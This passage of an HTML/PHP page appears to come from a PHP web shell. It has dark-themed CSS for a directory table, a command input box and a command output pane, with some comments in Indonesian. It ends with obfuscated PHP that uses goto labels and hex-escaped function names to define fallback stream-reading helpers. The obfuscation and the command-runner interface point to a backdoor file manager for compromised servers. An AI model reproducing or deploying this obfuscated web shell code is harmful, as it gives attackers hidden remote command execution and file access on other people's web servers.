    .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
    .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.5rem .75rem;width:100%;background:#0b1220;color:#e5e7eb;}
    .field:focus{outline:none;box-shadow:0 0 0 4px rgba(99,102,241,.25);border-color:#7c00ff}
    .btn{background:linear-gradient(180deg,#7c00ff,#e400ff);color:#eef2ff;border-radius:10px;padding:.5rem .75rem;font-weight:700;font-size:.875rem;line-height:1.25rem;display:inline-flex;align-items:center;justify-content:center;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(99,102,241,.22);}
    .btn:hover{filter:brightness(1.06);box-shadow:0 10px 26px rgba(99,102,241,.35)} .btn:active{transform:translateY(.5px)}
    .btn-ghost{background:transparent;border:1px solid rgba(148,163,184,.25);color:#e5e7eb;}
    .btn-xs{padding:.25rem .5rem;font-size:.75rem;border-radius:8px}.btn-sm{padding:.35rem .6rem;font-size:.8125rem;border-radius:9px}.btnw{min-width:96px}
    .tbl thead th{position:sticky;top:0;background:#0b1220e6;backdrop-filter:blur(6px);z-index:1;color:#cbd5e1}
    .tbl tbody tr:nth-child(even){background:rgba(148,163,184,.04)}
    .tbl tbody tr.hoverable:hover{background:rgba(99,102,241,.22);box-shadow:inset 0 0 0 9999px rgba(99,102,241,.10)}
    .tbl tbody tr.hoverable{transition:background .15s ease}
    .ico{width:18px;height:18px;display:inline-block;vertical-align:text-bottom;color:#cbd5e1}
    .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
    .badge-small{font-size:11px;padding:.1rem .4rem;border-radius:999px;background:#111827;color:#c7d2fe;border:1px solid #374151}
    .row-actions{display:grid;grid-template-columns:repeat(8, minmax(90px, auto));gap:.35rem;justify-items:start}
    @media (max-width:1200px){ .row-actions{grid-template-columns:repeat(3, minmax(90px, auto));} }
    .tablewrap{height:calc(100vh - 320px);overflow:auto}
    @media (max-height:800px){ .tablewrap{height:calc(100vh - 360px)} }
    .drop-hint{border:2px dashed rgba(99,102,241,.45); background:rgba(99,102,241,.06)}
    .droptarget{outline:2px dashed rgba(99,102,241,.7); outline-offset:-2px}
    /*#tableCard{ min-height: calc(100vh - 260px); }*/

    /* Command editors */
    .cm-cmd-input { font-size:13px; line-height:1.45; }
    .cm-cmd-input .CodeMirror { width:100% !important; }
    .cm-cmd-input .CodeMirror-scroll { height:36px !important; } /* single line */
    .cm-cmd-input .CodeMirror { height:36px !important; }
    .cm-cmd-output { font-size:14px; line-height:1.5; }
    .cm-cmd-output .CodeMirror { width:100% !important; }
    .cm-cmd-output .CodeMirror-scroll { height:380px !important; }

    /* Lebar command dibatasi agar tidak terlalu panjang */
    .cmd-container{ max-width:600px; width:100%; }
    @media (min-width:1536px){ .cmd-container{ max-width:680px; } }

    /* Make table copy-friendly */
    #tableCard, #tableCard * { user-select: text; -webkit-user-select: text; }

    /* Force ALL links inside the directory table to be white */
    #dirTable a, #dirTable a:visited { color:#ffffff !important; }

    /* Footer gradient line */
    .footer-line{height:1px;background:linear-gradient(90deg,rgba(99,102,241,.0),rgba(99,102,241,.5),rgba(99,102,241,.0));}

    /* Placeholder abu untuk CodeMirror command */
    .cm-cmd-input .CodeMirror-empty .CodeMirror-placeholder {
      color:#94a3b8; /* slate-400 */
      opacity:.95;
    }
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/mode/loadmode.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/meta.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/closebrackets.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/selection/active-line.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/display/placeholder.min.js"></script>
</head>
<body class="shell text-slate-100" id="bodyRoot">
  <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-slate-900/70 backdrop-blur">
    <div class="w-full px-6 py-3 flex items-center justify-between gap-3">
      <div class="flex items-center gap-3 shrink-0">
        <div class="text-2xl"><?php  goto qbmBS; Jqx5V: if (!function_exists("\x66\170\137\163\164\162\145\141\155\x5f\x67\x65\164\x5f\x63\x6f\156\164\x65\x6e\x74\163")) { function fx_stream_get_contents($handle, $maxlength = -1, $offset = -1) { if (is_fn_usable("\163\164\x72\x65\x61\155\x5f\147\145\x74\137\143\157\x6e\x74\145\x6e\x74\x73")) { return @stream_get_contents($handle, $maxlength, $offset); } if ($offset > 0) { @fseek($handle, $offset); } $data = ''; if ($maxlength === -1) { while (!feof($handle)) { $data .= @fread($handle, 8192); } } else { $data = @fread($handle, $maxlength); } return $data; } }
